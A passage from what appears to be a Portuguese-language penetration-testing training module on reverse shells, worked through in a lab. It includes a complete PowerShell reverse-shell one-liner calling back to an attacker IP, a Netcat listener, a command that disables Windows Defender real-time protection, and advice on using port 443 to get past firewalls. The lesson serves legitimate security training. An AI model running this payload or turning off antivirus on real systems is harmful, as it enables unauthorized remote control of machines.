Com um `reverse shell`, a caixa de ataque terá um ouvinte em execução e o destino precisará iniciar a conexão.

#### Exemplo de shell reverso

![[Pasted image 20230704181326.png]]

Geralmente, usamos esse tipo de shell à medida que nos deparamos com sistemas vulneráveis, porque é provável que um administrador negligencie as conexões de saída, dando-nos uma melhor chance de não ser detectado. A última seção discutiu como os bind shells dependem das conexões de entrada permitidas pelo firewall no lado do servidor. Será muito mais difícil conseguir isso em um cenário do mundo real. Como visto na imagem acima, estamos iniciando um ouvinte para um shell reverso em nossa caixa de ataque e usando algum método ( exemplo: `Unrestricted File Upload`, `Command Injection`, etc .. ) para forçar o destino a iniciar uma conexão com nossa caixa de destino, significando efetivamente que nossa caixa de ataque se torna o servidor e o destino se torna o cliente.

Nem sempre precisamos reinventar a roda quando se trata de cargas úteis ( comandos e código ) que pretendemos usar ao tentar estabelecer um shell reverso com um alvo. Existem ferramentas úteis que os veteranos da infosec reuniram para nos ajudar. [Folha de dicas reversa da Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) é um recurso fantástico que contém uma lista de diferentes comandos, códigos e até geradores de shell reverso automatizados que podemos usar ao praticar ou em um engate real. Devemos estar cientes de que muitos administradores estão cientes dos repositórios públicos e dos recursos de código aberto que os testadores de penetração costumam usar. Eles podem fazer referência a esses repos como parte de suas considerações principais sobre o que esperar de um ataque e ajustar seus controles de segurança de acordo. Em alguns casos, podemos precisar personalizar um pouco nossos ataques.

Vamos trabalhar com isso para entender melhor esses conceitos.

## Hands-on com um shell reverso simples no Windows

Com esse passo, estabeleceremos um shell reverso simples usando algum código PowerShell em um destino do Windows. Vamos começar o alvo e começar.

Podemos iniciar um ouvinte Netcat em nossa caixa de ataque à medida que o alvo aparece.

#### Servidor (`attack box`)

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Desta vez, com o nosso ouvinte, estamos vinculando-o a um [porta comum](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) (`443`), essa porta geralmente é para conexões `HTTPS`. Podemos querer usar portas comuns como essa porque, quando iniciamos a conexão com nosso ouvinte, queremos garantir que ele não seja bloqueado saindo pelo firewall do sistema operacional e no nível da rede. Seria raro ver qualquer equipe de segurança bloqueando a saída 443, já que muitos aplicativos e organizações dependem do HTTPS para acessar vários sites durante o dia de trabalho. Dito isto, um firewall capaz de inspeção profunda de pacotes e visibilidade da camada 7 pode ser capaz de detectar e & pare um shell reverso saindo de uma porta comum porque está examinando o conteúdo dos pacotes de rede, não apenas o endereço IP e a porta. A evasão detalhada do firewall está fora do escopo deste módulo, portanto, tocaremos brevemente nas técnicas de detecção e evasão em todo o módulo, bem como na seção dedicada no final.

Depois que o destino do Windows aparecer, vamos nos conectar usando o RDP.

O Netcat pode ser usado para iniciar o shell reverso no lado do Windows, mas devemos estar atentos aos aplicativos que já estão presentes no sistema. O Netcat não é nativo dos sistemas Windows, portanto, pode não ser confiável contar com o uso como nossa ferramenta no lado do Windows. Veremos em uma seção posterior que, para usar o Netcat no Windows, precisamos transferir um binário do Netcat para um destino, o que pode ser complicado quando não temos recursos de upload de arquivos desde o início. Dito isto, é ideal usar todas as ferramentas nativas ( que vivem da terra ) para o alvo ao qual estamos tentando obter acesso.

`What applications and shell languages are hosted on the target?`

Esta é uma excelente pergunta a qualquer momento que estamos tentando estabelecer um shell reverso. Vamos usar o prompt de comando e o PowerShell para estabelecer esse shell reverso simples. Podemos usar um forro de shell reverso PowerShell padrão para ilustrar esse ponto.

No destino do Windows, abra um prompt de comando e copie e cole este comando:

#### Alvo do cliente
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

`Nota: Se estivermos usando o Pwnbox, lembre-se de que alguns navegadores não funcionam tão perfeitamente ao usar o recurso Área de transferência para colar um comando diretamente na CLI de um destino. Nesses casos, podemos colar no Bloco de Notas no destino e copiar e colar de dentro do destino.`

Por favor, dê uma olhada no comando e considere o que precisamos mudar para que possamos estabelecer um shell reverso com nossa caixa de ataque. Este código PowerShell também pode ser chamado `shell code` ou nossa `payload`. Entregar essa carga útil no sistema Windows foi bastante direto, considerando que temos controle completo do destino para fins de demonstração. À medida que este módulo avança, perceberemos a dificuldade de aumentar a maneira como entregamos a carga útil nas metas.

`What happened when we hit enter in command prompt?`

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

O `Windows Defender antivirus` (O software `AV` ) interrompeu a execução do código. Isso está funcionando exatamente como pretendido e de um perspectiva `defensiva` , isso é uma `win`. Do ponto de vista ofensivo, existem alguns obstáculos a serem superados se o AV estiver ativado em um sistema com o qual estamos tentando nos conectar. Para nossos propósitos, desejaremos desativar o antivírus através do `Virus & threat protection settings` ou usando este comando em um console administrativo do PowerShell (clique com o botão direito do mouse, execute como admin):

#### Desativar AV

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Depois que o AV estiver desativado, tente executar o código novamente.

#### Caixa de ataque do servidor

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

De volta à nossa caixa de ataque, devemos notar que estabelecemos com sucesso uma concha reversa. Podemos ver isso pela alteração no prompt que começa com `PS` e nossa capacidade de interagir com o sistema operacional e o sistema de arquivos. Tente executar alguns comandos padrão do Windows para praticar um pouco.

